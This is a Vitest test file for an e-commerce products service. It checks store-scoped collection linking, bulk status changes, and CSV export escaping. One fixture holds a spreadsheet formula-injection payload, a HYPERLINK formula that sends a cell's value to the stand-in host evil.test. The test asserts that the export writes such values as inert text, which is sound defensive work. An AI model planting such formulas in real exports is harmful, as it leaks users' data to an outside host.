import { beforeEach, describe, expect, test, vi } from "vitest";

const db = vi.hoisted(() => ({
  shopCollection: { count: vi.fn() },
  shopProduct: { create: vi.fn(), findMany: vi.fn(), updateMany: vi.fn() },
  shopVariant: { findFirst: vi.fn(async () => null) },
  shopInventoryMovement: { createMany: vi.fn() },
}));
const queue = vi.hoisted(() => ({ enqueueCatalogPublish: vi.fn() }));

vi.mock("../../../utils/prisma.js", () => ({ default: db }));
vi.mock("../../../workers/bullmq/queues/shop.queue.js", () => queue);

const { bulkSetStatus, createProduct, exportProductsCsv } = await import("./products.service.js");

beforeEach(() => vi.clearAllMocks());

describe("collections from the request", () => {
  const input = {
    title: "Mug",
    variants: [{ title: "Default", price: 10 }],
    collectionIds: ["mine", "theirs"],
  };

  test("another store's collection is refused before anything is written", async () => {
    db.shopCollection.count.mockResolvedValue(1);
    await expect(createProduct({ id: "s1", orgId: "o" }, input as never)).rejects.toMatchObject({
      code: "INVALID",
    });
    expect(db.shopCollection.count).toHaveBeenCalledWith({
      where: { storeId: "s1", id: { in: ["mine", "theirs"] } },
    });
    expect(db.shopProduct.create).not.toHaveBeenCalled();
  });

  test("the store's own collections are linked", async () => {
    db.shopCollection.count.mockResolvedValue(2);
    db.shopProduct.create.mockResolvedValue({ id: "p1", variants: [] });
    await createProduct({ id: "s1", orgId: "o" }, input as never);
    expect(db.shopProduct.create).toHaveBeenCalled();
  });
});

describe("bulk status", () => {
  test("republishes only the store's own products", async () => {
    db.shopProduct.findMany.mockResolvedValue([{ id: "p1" }]);
    await bulkSetStatus("s1", ["p1", "someone-elses"], "DRAFT");
    expect(queue.enqueueCatalogPublish).toHaveBeenCalledTimes(1);
    expect(queue.enqueueCatalogPublish).toHaveBeenCalledWith("p1");
  });
});

describe("product export", () => {
  test("a formula in a product's text is written as text", async () => {
    db.shopProduct.findMany.mockResolvedValue([
      {
        title: '=HYPERLINK("http://evil.test/?"&A2,"x")',
        description: "@SUM(1,2)",
        status: "ACTIVE",
        images: [],
        collections: [{ name: "+Sale" }],
        variants: [
          {
            title: "-Small",
            sku: "\tSKU",
            price: "10",
            compareAtPrice: null,
            trackInventory: false,
            stock: 0,
            imageUrl: null,
          },
        ],
      },
    ]);
    const [, row] = (await exportProductsCsv("s1")).split("\n");
    expect(row.startsWith(`"'=HYPERLINK`)).toBe(true);
    expect(row).toContain("'-Small");
    expect(row).toContain("'\tSKU");
    expect(row).toContain("'+Sale");
    expect(row).toContain("'@SUM(1,2)");
  });
});
